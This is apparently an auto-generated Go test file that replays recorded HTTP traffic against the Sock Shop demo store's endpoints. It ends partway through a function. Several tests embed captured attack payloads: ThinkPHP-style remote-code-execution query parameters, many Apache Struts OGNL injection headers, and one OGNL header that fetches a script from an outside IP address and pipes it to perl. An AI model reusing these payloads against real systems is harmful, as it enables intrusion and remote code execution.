package up9_autogenerated_tests

import (
    . "authentication"
    . "up9lib"
    assert "github.com/stretchr/testify/assert"
    fmt "fmt"
    testing "testing"
)

func TestGet001(t *testing.T) {
    for _, tt := range LoadDataset(t, "data/1/dataset_1.json") {
        amp_cache_transform := tt.(map[string]interface{})["amp_cache_transform"]
        content := tt.(map[string]interface{})["content"]
        keep_alive := tt.(map[string]interface{})["keep_alive"]
        param := tt.(map[string]interface{})["param"]
        postman_token := tt.(map[string]interface{})["postman_token"]
        r := tt.(map[string]interface{})["r"]
        s := tt.(map[string]interface{})["s"]
        vars_0_ := tt.(map[string]interface{})["vars_0_"]
        x_datadog_parent_id := tt.(map[string]interface{})["x_datadog_parent_id"]
        x_datadog_trace_id := tt.(map[string]interface{})["x_datadog_trace_id"]

        // GET http://front-end.sock-shop/ (endp 1)
        frontEndSockShop := GetHttpClient(t, "http://front-end.sock-shop", new(Authentication))
        req := new(HttpRequest)
        req.SetQueryString(map[string]interface{}{
            "": param,
            "XDEBUG_SESSION_START": "phpstorm",
            "a": "fetch",
            "content": content,
            "debug": "1",
            "function": "call_user_func_array",
            "q": "login.destroy.session",
            "r": r,
            "s": s,
            "up_auto_log": "true",
            "vars[0]": vars_0_,
        })
        req.SetHeaders(map[string]interface{}{
            "accept": "text/html",
            "amp-cache-transform": amp_cache_transform,
            "keep-alive": keep_alive,
            "postman-token": postman_token,
            "x-datadog-parent-id": x_datadog_parent_id,
            "x-datadog-sampling-priority": "0",
            "x-datadog-trace-id": x_datadog_trace_id,
        })
        resp := frontEndSockShop.Get(req, "/")
        assert.Equal(t, 200, resp.StatusCode())
        assert.Contains(t, CssSelect(t, "div#hot div.box div.container div h2", resp), "Hot this week")
    }
}

func TestGet125(t *testing.T) {
    for _, tt := range LoadDataset(t, "data/125/dataset_125.json") {
        content := tt.(map[string]interface{})["content"]

        // GET http://front-end.sock-shop/ (endp 125)
        frontEndSockShop := GetHttpClient(t, "http://front-end.sock-shop", new(Authentication))
        req := new(HttpRequest)
        req.SetQueryString(map[string]interface{}{
            "a": "fetch",
            "content": content,
        })
        req.SetHeaders(map[string]interface{}{
            "content-type": "application/json",
        })
        resp := frontEndSockShop.Get(req, "/")
        assert.Equal(t, 200, resp.StatusCode())
        assert.Contains(t, CssSelect(t, "div#hot div.box div.container div h2", resp), "Hot this week")
    }
}

func TestGet187(t *testing.T) {
    // GET http://front-end.sock-shop/ (endp 187)
    frontEndSockShop := GetHttpClient(t, "http://front-end.sock-shop", new(Authentication))
    req := new(HttpRequest)
    req.SetHeaders(map[string]interface{}{
        "content-type": "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X30mknbA'",
    })
    resp := frontEndSockShop.Get(req, "/")
    assert.Equal(t, 200, resp.StatusCode())
    assert.Contains(t, CssSelect(t, "div#hot div.box div.container div h2", resp), "Hot this week")
}

func TestGet190(t *testing.T) {
    // GET http://front-end.sock-shop/ (endp 190)
    frontEndSockShop := GetHttpClient(t, "http://front-end.sock-shop", new(Authentication))
    req := new(HttpRequest)
    req.SetHeaders(map[string]interface{}{
        "content-type": "application/x-www-form-urlencoded",
    })
    resp := frontEndSockShop.Get(req, "/")
    assert.Equal(t, 200, resp.StatusCode())
    assert.Contains(t, CssSelect(t, "div#hot div.box div.container div h2", resp), "Hot this week")
}

func TestHead191(t *testing.T) {
    // HEAD http://front-end.sock-shop/ (endp 191)
    frontEndSockShop := GetHttpClient(t, "http://front-end.sock-shop", new(Authentication))
    req := new(HttpRequest)
    resp := frontEndSockShop.Head(req, "/")
    assert.Equal(t, 200, resp.StatusCode())
}

func TestGet192(t *testing.T) {
    // GET http://front-end.sock-shop/ (endp 192)
    frontEndSockShop := GetHttpClient(t, "http://front-end.sock-shop", new(Authentication))
    req := new(HttpRequest)
    req.SetHeaders(map[string]interface{}{
        "content-type": "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('x4KNnCMm'",
    })
    resp := frontEndSockShop.Get(req, "/")
    assert.Equal(t, 200, resp.StatusCode())
    assert.Contains(t, CssSelect(t, "div#hot div.box div.container div h2", resp), "Hot this week")
}

func TestGet193(t *testing.T) {
    // GET http://front-end.sock-shop/ (endp 193)
    frontEndSockShop := GetHttpClient(t, "http://front-end.sock-shop", new(Authentication))
    req := new(HttpRequest)
    req.SetHeaders(map[string]interface{}{
        "content-type": "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('xVSERkYM'",
    })
    resp := frontEndSockShop.Get(req, "/")
    assert.Equal(t, 200, resp.StatusCode())
    assert.Contains(t, CssSelect(t, "div#hot div.box div.container div h2", resp), "Hot this week")
}

func TestGet194(t *testing.T) {
    // GET http://front-end.sock-shop/ (endp 194)
    frontEndSockShop := GetHttpClient(t, "http://front-end.sock-shop", new(Authentication))
    req := new(HttpRequest)
    req.SetHeaders(map[string]interface{}{
        "content-type": "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('tMeGL0pH'",
    })
    resp := frontEndSockShop.Get(req, "/")
    assert.Equal(t, 200, resp.StatusCode())
    assert.Contains(t, CssSelect(t, "div#hot div.box div.container div h2", resp), "Hot this week")
}

func TestGet195(t *testing.T) {
    // GET http://front-end.sock-shop/ (endp 195)
    frontEndSockShop := GetHttpClient(t, "http://front-end.sock-shop", new(Authentication))
    req := new(HttpRequest)
    req.SetHeaders(map[string]interface{}{
        "content-type": "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('Uhk9c9CM'",
    })
    resp := frontEndSockShop.Get(req, "/")
    assert.Equal(t, 200, resp.StatusCode())
    assert.Contains(t, CssSelect(t, "div#hot div.box div.container div h2", resp), "Hot this week")
}

func TestGet207(t *testing.T) {
    // GET http://front-end.sock-shop/ (endp 207)
    frontEndSockShop := GetHttpClient(t, "http://front-end.sock-shop", new(Authentication))
    req := new(HttpRequest)
    req.SetHeaders(map[string]interface{}{
        "content-type": "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('qieoAZ6u'",
    })
    resp := frontEndSockShop.Get(req, "/")
    assert.Equal(t, 200, resp.StatusCode())
    assert.Contains(t, CssSelect(t, "div#hot div.box div.container div h2", resp), "Hot this week")
}

func TestGet211(t *testing.T) {
    // GET http://front-end.sock-shop/ (endp 211)
    frontEndSockShop := GetHttpClient(t, "http://front-end.sock-shop", new(Authentication))
    req := new(HttpRequest)
    req.SetHeaders(map[string]interface{}{
        "content-type": "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('uUVc2U8M'",
    })
    resp := frontEndSockShop.Get(req, "/")
    assert.Equal(t, 200, resp.StatusCode())
    assert.Contains(t, CssSelect(t, "div#hot div.box div.container div h2", resp), "Hot this week")
}

func TestGet212(t *testing.T) {
    // GET http://front-end.sock-shop/ (endp 212)
    frontEndSockShop := GetHttpClient(t, "http://front-end.sock-shop", new(Authentication))
    req := new(HttpRequest)
    req.SetHeaders(map[string]interface{}{
        "content-type": "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('liape4t0'",
    })
    resp := frontEndSockShop.Get(req, "/")
    assert.Equal(t, 200, resp.StatusCode())
    assert.Contains(t, CssSelect(t, "div#hot div.box div.container div h2", resp), "Hot this week")
}

func TestGet213(t *testing.T) {
    // GET http://front-end.sock-shop/ (endp 213)
    frontEndSockShop := GetHttpClient(t, "http://front-end.sock-shop", new(Authentication))
    req := new(HttpRequest)
    req.SetHeaders(map[string]interface{}{
        "content-type": "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('uuurxrfw'",
    })
    resp := frontEndSockShop.Get(req, "/")
    assert.Equal(t, 200, resp.StatusCode())
    assert.Contains(t, CssSelect(t, "div#hot div.box div.container div h2", resp), "Hot this week")
}

func TestGet214(t *testing.T) {
    // GET http://front-end.sock-shop/ (endp 214)
    frontEndSockShop := GetHttpClient(t, "http://front-end.sock-shop", new(Authentication))
    req := new(HttpRequest)
    req.SetHeaders(map[string]interface{}{
        "content-type": "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('jyu8xkii'",
    })
    resp := frontEndSockShop.Get(req, "/")
    assert.Equal(t, 200, resp.StatusCode())
    assert.Contains(t, CssSelect(t, "div#hot div.box div.container div h2", resp), "Hot this week")
}

func TestGet215(t *testing.T) {
    // GET http://front-end.sock-shop/ (endp 215)
    frontEndSockShop := GetHttpClient(t, "http://front-end.sock-shop", new(Authentication))
    req := new(HttpRequest)
    req.SetHeaders(map[string]interface{}{
        "content-type": "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='wget -qO - http://209.90.79.141/pdf/s.pdf | perl",
    })
    resp := frontEndSockShop.Get(req, "/")
    assert.Equal(t, 200, resp.StatusCode())
    assert.Contains(t, CssSelect(t, "div#hot div.box div.container div h2", resp), "Hot this week")
}

func TestGet216(t *testing.T) {
    // GET http://front-end.sock-shop/ (endp 216)
    frontEndSockShop := GetHttpClient(t, "http://front-end.sock-shop", new(Authentication))
    req := new(HttpRequest)
    req.SetHeaders(map[string]interface{}{
        "content-type": "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('dyi8d0Jw'",
    })
    resp := frontEndSockShop.Get(req, "/")
    assert.Equal(t, 200, resp.StatusCode())
    assert.Contains(t, CssSelect(t, "div#hot div.box div.container div h2", resp), "Hot this week")
}

func TestGet218(t *testing.T) {
    // GET http://front-end.sock-shop/ (endp 218)
    frontEndSockShop := GetHttpClient(t, "http://front-end.sock-shop", new(Authentication))
    req := new(HttpRequest)
    req.SetHeaders(map[string]interface{}{
        "content-type": "text/html",
    })
    resp := frontEndSockShop.Get(req, "/")
    assert.Equal(t, 200, resp.StatusCode())
    assert.Contains(t, CssSelect(t, "div#hot div.box div.container div h2", resp), "Hot this week")
}

func TestGet219(t *testing.T) {
    // GET http://front-end.sock-shop/ (endp 219)
    frontEndSockShop := GetHttpClient(t, "http://front-end.sock-shop", new(Authentication))
    req := new(HttpRequest)
    req.SetHeaders(map[string]interface{}{
        "content-type": "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('jycf9lqq'",
    })
    resp := frontEndSockShop.Get(req, "/")
    assert.Equal(t, 200, resp.StatusCode())
    assert.Contains(t, CssSelect(t, "div#hot div.box div.container div h2", resp), "Hot this week")
}

func TestGet220(t *testing.T) {
    // GET http://front-end.sock-shop/ (endp 220)
    frontEndSockShop := GetHttpClient(t, "http://front-end.sock-shop", new(Authentication))
    req := new(HttpRequest)
    req.SetHeaders(map[string]interface{}{
        "content-type": "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('pkpxommw'",
    })
    resp := frontEndSockShop.Get(req, "/")
    assert.Equal(t, 200, resp.StatusCode())
    assert.Contains(t, CssSelect(t, "div#hot div.box div.container div h2", resp), "Hot this week")
}

func TestGet225(t *testing.T) {
    // GET http://front-end.sock-shop/ (endp 225)
    frontEndSockShop := GetHttpClient(t, "http://front-end.sock-shop", new(Authentication))
    req := new(HttpRequest)
    req.SetHeaders(map[string]interface{}{
        "content-type": "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('zUn5ygGk'",
    })
    resp := frontEndSockShop.Get(req, "/")
    assert.Equal(t, 200, resp.StatusCode())
    assert.Contains(t, CssSelect(t, "div#hot div.box div.container div h2", resp), "Hot this week")
}

func TestGet227(t *testing.T) {
    // GET http://front-end.sock-shop/ (endp 227)
    frontEndSockShop := GetHttpClient(t, "http://front-end.sock-shop", new(Authentication))
    req := new(HttpRequest)
    req.SetHeaders(map[string]interface{}{
        "content-type": "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('hnBSMl1i'",
    })
    resp := frontEndSockShop.Get(req, "/")
    assert.Equal(t, 200, resp.StatusCode())
    assert.Contains(t, CssSelect(t, "div#hot div.box div.container div h2", resp), "Hot this week")
}

func TestGet235(t *testing.T) {
    // GET http://front-end.sock-shop/ (endp 235)
    frontEndSockShop := GetHttpClient(t, "http://front-end.sock-shop", new(Authentication))
    req := new(HttpRequest)
    req.SetHeaders(map[string]interface{}{
        "content-type": "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('o4einzpi'",
    })
    resp := frontEndSockShop.Get(req, "/")
    assert.Equal(t, 200, resp.StatusCode())
    assert.Contains(t, CssSelect(t, "div#hot div.box div.container div h2", resp), "Hot this week")
}

func TestGet236(t *testing.T) {
    // GET http://front-end.sock-shop/ (endp 236)
    frontEndSockShop := GetHttpClient(t, "http://front-end.sock-shop", new(Authentication))
    req := new(HttpRequest)
    req.SetHeaders(map[string]interface{}{
        "content-type": "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('rfi8x4t9'",
    })
    resp := frontEndSockShop.Get(req, "/")
    assert.Equal(t, 200, resp.StatusCode())
    assert.Contains(t, CssSelect(t, "div#hot div.box div.container div h2", resp), "Hot this week")
}

func TestGet237(t *testing.T) {
    // GET http://front-end.sock-shop/ (endp 237)
    frontEndSockShop := GetHttpClient(t, "http://front-end.sock-shop", new(Authentication))
    req := new(HttpRequest)
    req.SetHeaders(map[string]interface{}{
        "content-type": "text/plain",
    })
    resp := frontEndSockShop.Get(req, "/")
    assert.Equal(t, 200, resp.StatusCode())
    assert.Contains(t, CssSelect(t, "div#hot div.box div.container div h2", resp), "Hot this week")
}

func TestGet238(t *testing.T) {
    // GET http://front-end.sock-shop/ (endp 238)
    frontEndSockShop := GetHttpClient(t, "http://front-end.sock-shop", new(Authentication))
    req := new(HttpRequest)
    req.SetHeaders(map[string]interface{}{
        "content-type": "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('VEh255IZ'",
    })
    resp := frontEndSockShop.Get(req, "/")
    assert.Equal(t, 200, resp.StatusCode())
    assert.Contains(t, CssSelect(t, "div#hot div.box div.container div h2", resp), "Hot this week")
}

func TestGet241(t *testing.T) {
    // GET http://front-end.sock-shop/ (endp 241)
    frontEndSockShop := GetHttpClient(t, "http://front-end.sock-shop", new(Authentication))
    req := new(HttpRequest)
    req.SetHeaders(map[string]interface{}{
        "content-type": "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('b1ko6ejb'",
    })
    resp := frontEndSockShop.Get(req, "/")
    assert.Equal(t, 200, resp.StatusCode())
    assert.Contains(t, CssSelect(t, "div#hot div.box div.container div h2", resp), "Hot this week")
}

func TestGetParam040(t *testing.T) {
    for _, tt := range LoadDataset(t, "data/40/dataset_40.json") {
        bs_real_ip := tt.(map[string]interface{})["bs_real_ip"]
        param := tt.(map[string]interface{})["param"]

        // GET http://front-end.sock-shop/{param} (endp 40)
        frontEndSockShop := GetHttpClient(t, "http://front-end.sock-shop", new(Authentication))
        req := new(HttpRequest)
        req.SetHeaders(map[string]interface{}{
            "bs_real_ip": bs_real_ip,
            "x-requested-with": "XMLHttpRequest",
        })
        resp := frontEndSockShop.Get(req, "/" + param.(string))
        assert.Equal(t, 200, resp.StatusCode())
        assert.Contains(t, CssSelect(t, "div#hot div.box div.container div h2", resp), "Hot this week")
    }
}

func TestGetAddress050(t *testing.T) {
    for _, tt := range LoadDataset(t, "data/50/dataset_50.json") {
        amp_cache_transform := tt.(map[string]interface{})["amp_cache_transform"]
        postman_token := tt.(map[string]interface{})["postman_token"]

        // GET http://front-end.sock-shop/address (endp 50)
        frontEndSockShop := GetHttpClient(t, "http://front-end.sock-shop", new(Authentication))
        req := new(HttpRequest)
        req.SetHeaders(map[string]interface{}{
            "amp-cache-transform": amp_cache_transform,
            "postman-token": postman_token,
            "x-requested-with": "XMLHttpRequest",
        })
        resp := frontEndSockShop.Get(req, "/address")
        assert.Equal(t, 200, resp.StatusCode())
        assert.NotNil(t, JsonPath(t, "$._links.self.href", resp.String()))
    }
}

func TestPostAddresses170(t *testing.T) {
    for _, tt := range LoadDataset(t, "data/170/dataset_170.json") {
        city := tt.(map[string]interface{})["city"]
        country := tt.(map[string]interface{})["country"]
        number := tt.(map[string]interface{})["number"]
        postman_token := tt.(map[string]interface{})["postman_token"]
        street := tt.(map[string]interface{})["street"]

        // GET http://front-end.sock-shop/customers/{customerId} (endp 62)
        frontEndSockShop := GetHttpClient(t, "http://front-end.sock-shop", new(Authentication))
        req := new(HttpRequest)
        req.SetHeaders(map[string]interface{}{
            "postman-token": postman_token,
            "x-requested-with": "XMLHttpRequest",
        })
        resp := frontEndSockShop.Get(req, "/customers/" + fmt.Sprint(GetCookie(t, "logged_in", resp)))
        assert.Equal(t, 200, resp.StatusCode())
        assert.NotNil(t, JsonPath(t, "$._links.self.href", resp.String()))
        postcode := JsonPath(t, "$.lastName", resp.String())

        // POST http://front-end.sock-shop/addresses (endp 170)
        req2 := new(HttpRequest)
        req2.SetHeaders(map[string]interface{}{
            "content-type": "application/json",
            "x-requested-with": "XMLHttpRequest",
        })
        req2.SetJsonBody("data/170/payload_for_endp_170.json", map[string]interface{}{
            "$.city": city,
            "$.country": country,
            "$.number": number,
            "$.postcode": postcode,
            "$.street": street,
        })
        resp2 := frontEndSockShop.Post(req2, "/addresses")
        assert.Equal(t, 200, resp2.StatusCode())
        assert.NotNil(t, JsonPath(t, "$.id", resp2.String()))
    }
}

func TestGetBasketHtml008(t *testing.T) {
    for _, tt := range LoadDataset(t, "data/8/dataset_8.json") {
        amp_cache_transform := tt.(map[string]interface{})["amp_cache_transform"]

        // GET http://front-end.sock-shop/basket.html (endp 8)
        frontEndSockShop := GetHttpClient(t, "http://front-end.sock-shop", new(Authentication))
        req := new(HttpRequest)
        req.SetHeaders(map[string]interface{}{
            "amp-cache-transform": amp_cache_transform,
        })
        resp := frontEndSockShop.Get(req, "/basket.html")
        assert.Equal(t, 200, resp.StatusCode())
        assert.Contains(t, CssSelect(t, "div#basket div.box form h1", resp), "Shopping cart")
    }
}

func TestGetCard052(t *testing.T) {
    for _, tt := range LoadDataset(t, "data/52/dataset_52.json") {
        amp_cache_transform := tt.(map[string]interface{})["amp_cache_transform"]
        postman_token := tt.(map[string]interface{})["postman_token"]

        // GET http://front-end.sock-shop/card (endp 52)
        frontEndSockShop := GetHttpClient(t, "http://front-end.sock-shop", new(Authentication))
        req := new(HttpRequest)
        req.SetHeaders(map[string]interface{}{
            "amp-cache-transform": amp_cache_transform,
            "postman-token": postman_token,
            "x-requested-with": "XMLHttpRequest",
        })
        resp := frontEndSockShop.Get(req, "/card")
        assert.Equal(t, 200, resp.StatusCode())
        assert.NotNil(t, JsonPath(t, "$.number", resp.String()))
    }
}

func TestPostCards173(t *testing.T) {
    for _, tt := range LoadDataset(t, "data/173/dataset_173.json") {
        ccv := tt.(map[string]interface{})["ccv"]
        expires := tt.(map[string]interface{})["expires"]
        longNum := tt.(map[string]interface{})["longNum"]

        // POST http://front-end.sock-shop/cards (endp 173)
        frontEndSockShop := GetHttpClient(t, "http://front-end.sock-shop", new(Authentication))
        req := new(HttpRequest)
        req.SetHeaders(map[string]interface{}{
            "content-type": "application/json",
            "x-requested-with": "XMLHttpRequest",
        })
        req.SetJsonBody("data/173/payload_for_endp_173.json", map[string]interface{}{
            "$.ccv": ccv,
            "$.expires": expires,
            "$.longNum": longNum,
        })
        resp := frontEndSockShop.Post(req, "/cards")
        assert.Equal(t, 200, resp.StatusCode())
        assert.NotNil(t, JsonPath(t, "$.id", resp.String()))
    }
}

func TestPostCart009(t *testing.T) {
    for _, tt := range LoadDataset(t, "data/9/dataset_9.json") {
        amp_cache_transform := tt.(map[string]interface{})["amp_cache_transform"]
        postman_token := tt.(map[string]interface{})["postman_token"]
        postman_token1 := tt.(map[string]interface{})["postman_token1"]
        size := tt.(map[string]interface{})["size"]
        tags := tt.(map[string]interface{})["tags"]

        // GET http://front-end.sock-shop/catalogue (endp 11)
        frontEndSockShop := GetHttpClient(t, "http://front-end.sock-shop", new(Authentication))
        req := new(HttpRequest)
        req.SetQueryString(map[string]interface{}{
            "page": "1",
            "size": size,
            "sort": "id",
            "tags": tags,
        })
        req.SetHeaders(map[string]interface{}{
            "amp-cache-transform": amp_cache_transform,
            "postman-token": postman_token,
            "x-requested-with": "XMLHttpRequest",
        })
        resp := frontEndSockShop.Get(req, "/catalogue")
        assert.Equal(t, 200, resp.StatusCode())
        assert.NotNil(t, JsonPath(t, "$[*].tag[*]", resp.String()))
        id := JsonPath(t, "$[*].id", resp.String())

        // POST http://front-end.sock-shop/cart (endp 9)
        req2 := new(HttpRequest)
        req2.SetHeaders(map[string]interface{}{
            "content-type": "application/json",
            "postman-token": postman_token1,
            "x-requested-with": "XMLHttpRequest",
        })
        req2.SetJsonBody("data/9/payload_for_endp_9.json", map[string]interface{}{
            "$.id": id,
        })
        resp2 := frontEndSockShop.Post(req2, "/cart")
        assert.Equal(t, 201, resp2.StatusCode())
    }
}

func TestGetCart035(t *testing.T) {
    for _, tt := range LoadDataset(t, "data/35/dataset_35.json") {
        amp_cache_transform := tt.(map[string]interface{})["amp_cache_transform"]
        postman_token := tt.(map[string]interface{})["postman_token"]

        // GET http://front-end.sock-shop/cart (endp 35)
        frontEndSockShop := GetHttpClient(t, "http://front-end.sock-shop", new(Authentication))
        req := new(HttpRequest)
        req.SetHeaders(map[string]interface{}{
            "amp-cache-transform": amp_cache_transform,
            "postman-token": postman_token,
            "x-requested-with": "XMLHttpRequest",
        })
        resp := frontEndSockShop.Get(req, "/cart")
        assert.Equal(t, 200, resp.StatusCode())
        assert.NotNil(t, JsonPath(t, "$[*].id", resp.String()))
    }
}

func TestPostCartUpdate234(t *testing.T) {
    for _, tt := range LoadDataset(t, "data/234/dataset_234.json") {
        id := tt.(map[string]interface{})["id"]

        // POST http://front-end.sock-shop/cart/update (endp 234)
        frontEndSockShop := GetHttpClient(t, "http://front-end.sock-shop", new(Authentication))
        req := new(HttpRequest)
        req.SetHeaders(map[string]interface{}{
            "content-type": "application/json",
            "x-requested-with": "XMLHttpRequest",
        })
        req.SetJsonBody("data/234/payload_for_endp_234.json", map[string]interface{}{
            "$.id": id,
        })
        resp := frontEndSockShop.Post(req, "/cart/update")
        assert.Equal(t, 202, resp.StatusCode())
    }
}

func TestGetCatalogue199(t *testing.T) {
    for _, tt := range LoadDataset(t, "data/199/dataset_199.json") {
        size := tt.(map[string]interface{})["size"]
        tags := tt.(map[string]interface{})["tags"]

        // GET http://front-end.sock-shop/catalogue (endp 199)
        frontEndSockShop := GetHttpClient(t, "http://front-end.sock-shop", new(Authentication))
        req := new(HttpRequest)
        req.SetQueryString(map[string]interface{}{
            "page": "1",
            "size": size,
            "tags": tags,
        })
        req.SetHeaders(map[string]interface{}{
            "x-requested-with": "XMLHttpRequest",
        })
        resp := frontEndSockShop.Get(req, "/catalogue")
        assert.Equal(t, 200, resp.StatusCode())
    }
}

func TestGetCatalogue206(t *testing.T) {
    for _, tt := range LoadDataset(t, "data/206/dataset_206.json") {
        size := tt.(map[string]interface{})["size"]

        // GET http://front-end.sock-shop/catalogue (endp 206)
        frontEndSockShop := GetHttpClient(t, "http://front-end.sock-shop", new(Authentication))
        req := new(HttpRequest)
        req.SetQueryString(map[string]interface{}{
            "size": size,
        })
        req.SetHeaders(map[string]interface{}{
            "x-requested-with": "XMLHttpRequest",
        })
        resp := frontEndSockShop.Get(req, "/catalogue")
        assert.Equal(t, 200, resp.StatusCode())
    }
}

func TestGetCatalogueId056(t *testing.T) {
    for _, tt := range LoadDataset(t, "data/56/dataset_56.json") {
        amp_cache_transform := tt.(map[string]interface{})["amp_cache_transform"]
        postman_token := tt.(map[string]interface{})["postman_token"]
        postman_token1 := tt.(map[string]interface{})["postman_token1"]
        size := tt.(map[string]interface{})["size"]
        tags := tt.(map[string]interface{})["tags"]

        // GET http://front-end.sock-shop/catalogue (endp 11)
        frontEndSockShop := GetHttpClient(t, "http://front-end.sock-shop", new(Authentication))
        req := new(HttpRequest)
        req.SetQueryString(map[string]interface{}{
            "page": "1",
            "size": size,
            "sort": "id",
            "tags": tags,
        })
        req.SetHeaders(map[string]interface{}{
            "amp-cache-transform": amp_cache_transform,
            "postman-token": postman_token,
            "x-requested-with": "XMLHttpRequest",
        })
        resp := frontEndSockShop.Get(req, "/catalogue")
        assert.Equal(t, 200, resp.StatusCode())
        assert.NotNil(t, JsonPath(t, "$[*].tag[*]", resp.String()))
        id := JsonPath(t, "$[*].id", resp.String())

        // GET http://front-end.sock-shop/catalogue/{id} (endp 56)
        req2 := new(HttpRequest)
        req2.SetHeaders(map[string]interface{}{
            "postman-token": postman_token1,
            "x-requested-with": "XMLHttpRequest",
        })
        resp2 := frontEndSockShop.Get(req2, "/catalogue/" + id)
        assert.Equal(t, 200, resp2.StatusCode())
        assert.NotNil(t, JsonPath(t, "$.tag[*]", resp2.String()))
    }
}

func TestGetCatalogueSize036(t *testing.T) {
    for _, tt := range LoadDataset(t, "data/36/dataset_36.json") {
        amp_cache_transform := tt.(map[string]interface{})["amp_cache_transform"]
        postman_token := tt.(map[string]interface{})["postman_token"]
        tags := tt.(map[string]interface{})["tags"]

        // GET http://front-end.sock-shop/catalogue/size (endp 36)
        frontEndSockShop := GetHttpClient(t, "http://front-end.sock-shop", new(Authentication))
        req := new(HttpRequest)
        req.SetQueryString(map[string]interface{}{
            "tags": tags,
        })
        req.SetHeaders(map[string]interface{}{
            "amp-cache-transform": amp_cache_transform,
            "postman-token": postman_token,
            "x-requested-with": "XMLHttpRequest",
        })
        resp := frontEndSockShop.Get(req, "/catalogue/size")
        assert.Equal(t, 200, resp.StatusCode())
        assert.NotNil(t, JsonPath(t, "$.tag[*]", resp.String()))
    }
}

func TestGetCatalogueSize201(t *testing.T) {
    // GET http://front-end.sock-shop/catalogue/size (endp 201)
    frontEndSockShop := GetHttpClient(t, "http://front-end.sock-shop", new(Authentication))
    req := new(HttpRequest)
    req.SetQueryString(map[string]interface{}{
        "tags": "",
    })
    req.SetHeaders(map[string]interface{}{
        "x-requested-with": "XMLHttpRequest",
    })
    resp := frontEndSockShop.Get(req, "/catalogue/size")
    assert.Equal(t, 200, resp.StatusCode())
}

func TestGetCategoryHtml012(t *testing.T) {
    for _, tt := range LoadDataset(t, "data/12/dataset_12.json") {
        amp_cache_transform := tt.(map[string]interface{})["amp_cache_transform"]
        tags := tt.(map[string]interface{})["tags"]

        // GET http://front-end.sock-shop/category.html (endp 12)
        frontEndSockShop := GetHttpClient(t, "http://front-end.sock-shop", new(Authentication))
        req := new(HttpRequest)
        req.SetQueryString(map[string]interface{}{
            "tags": tags,
        })
        req.SetHeaders(map[string]interface{}{
            "amp-cache-transform": amp_cache_transform,
        })
        resp := frontEndSockShop.Get(req, "/category.html")
        assert.Equal(t, 200, resp.StatusCode())
        assert.Contains(t, CssSelect(t, "div#content div.container div div.panel.panel-default.sidebar-menu div.panel-heading h3.panel-title", resp), "Filters ")
    }
}

func TestGetCategoryHtml242(t *testing.T) {
    // GET http://front-end.sock-shop/category.html (endp 242)
    frontEndSockShop := GetHttpClient(t, "http://front-end.sock-shop", new(Authentication))
    req := new(HttpRequest)
    resp := frontEndSockShop.Get(req, "/category.html")
    assert.Equal(t, 206, resp.StatusCode())
}

func TestGetCustomerOrderHtml060(t *testing.T) {
    for _, tt := range LoadDataset(t, "data/60/dataset_60.json") {
        order := tt.(map[string]interface{})["order"]
        postman_token := tt.(map[string]interface{})["postman_token"]

        // GET http://front-end.sock-shop/customer-order.html (endp 60)
        frontEndSockShop := GetHttpClient(t, "http://front-end.sock-shop", new(Authentication))
        req := new(HttpRequest)
        req.SetQueryString(map[string]interface{}{
            "order": order,
        })
        req.SetHeaders(map[string]interface{}{
            "postman-token": postman_token,
        })
        resp := frontEndSockShop.Get(req, "/customer-order.html")
        assert.Equal(t, 200, resp.StatusCode())
        assert.Contains(t, CssSelect(t, "div#customer-order div.box h2", resp), "Order #")
    }
}

func TestGetCustomerOrdersHtml061(t *testing.T) {
    for _, tt := range LoadDataset(t, "data/61/dataset_61.json") {
        amp_cache_transform := tt.(map[string]interface{})["amp_cache_transform"]
        postman_token := tt.(map[string]interface{})["postman_token"]

        // GET http://front-end.sock-shop/customer-orders.html (endp 61)
        frontEndSockShop := GetHttpClient(t, "http://front-end.sock-shop", new(Authentication))
        req := new(HttpRequest)
        req.SetHeaders(map[string]interface{}{
            "amp-cache-transform": amp_cache_transform,
            "postman-token": postman_token,
        })
        resp := frontEndSockShop.Get(req, "/customer-orders.html")
        assert.Equal(t, 200, resp.StatusCode())
        assert.Contains(t, CssSelect(t, "div#customer-orders div.box h1", resp), "My orders")
    }
}

func TestGetCustomers224(t *testing.T) {
    for _, tt := range LoadDataset(t, "data/224/dataset_224.json") {
        postman_token := tt.(map[string]interface{})["postman_token"]

        // GET http://front-end.sock-shop/customers (endp 224)
        frontEndSockShop := GetHttpClient(t, "http://front-end.sock-shop", new(Authentication))
        req := new(HttpRequest)
        req.SetHeaders(map[string]interface{}{
            "postman-token": postman_token,
            "x-requested-with": "XMLHttpRequest",
        })
        resp := frontEndSockShop.Get(req, "/customers")
        assert.Equal(t, 200, resp.StatusCode())
        assert.NotNil(t, JsonPath(t, "$._embedded.customer[*]._links.self.href", resp.String()))
    }
}

func TestGetDetailHtml013(t *testing.T) {
    for _, tt := range LoadDataset(t, "data/13/dataset_13.json") {
        amp_cache_transform := tt.(map[string]interface{})["amp_cache_transform"]
